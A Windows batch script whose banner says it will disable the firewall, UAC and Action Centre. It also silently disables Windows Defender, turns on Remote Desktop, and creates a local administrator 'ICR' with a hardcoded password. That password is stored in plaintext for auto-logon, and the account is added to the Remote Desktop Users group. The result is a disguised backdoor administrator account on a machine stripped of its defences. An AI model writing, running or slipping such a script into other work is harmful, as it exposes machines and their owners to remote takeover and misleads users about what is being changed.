@echo off
::Display warning message
echo Warning! MUST RUN WITH ADMINISTRATOR PRIVILAGES!! 
echo This file will disable and stop Windows Firewall, UAC, and Action Centre.
echo your PC will reboot for the changes to be fully applied.
pause

::Test If script has Admin Priviledges/is elevated
net session >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
ECHO you are Administrator
) ELSE (
ECHO you are NOT Administrator. Exiting...
PING 127.0.0.1 > NUL 2>&1
EXIT /B 1
)

::Display final warning
echo Only continue if you are sure
pause

::Stop and disable windows firewall
net stop MpsSvc
REG add "HKLM\SYSTEM\CurrentControlSet\services\MpsSvc" /v Start /t REG_DWORD /d 4 /f

::disable action center Health
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAHealth /t REG_SZ /d 1 /f

::disable UAC
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

::disable Windows Defender
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f

::Enable RDP
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 1 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
sc config TermService start= auto
net start Termservice

::Check and add ICR user
net user | find /i "ICR" || Net user ICR Acce$$2020 /add /fullname:"Tempgp"
net localgroup administrators ICR /add

::Set ICR to auto login
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d ICR /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d Acce$$2020 /f

::Add ICR to RDP group
NET LOCALGROUP "Remote Desktop Users" ICR /ADD

echo Press 'Enter' To restart your PC
pause
shutdown -r -t 00
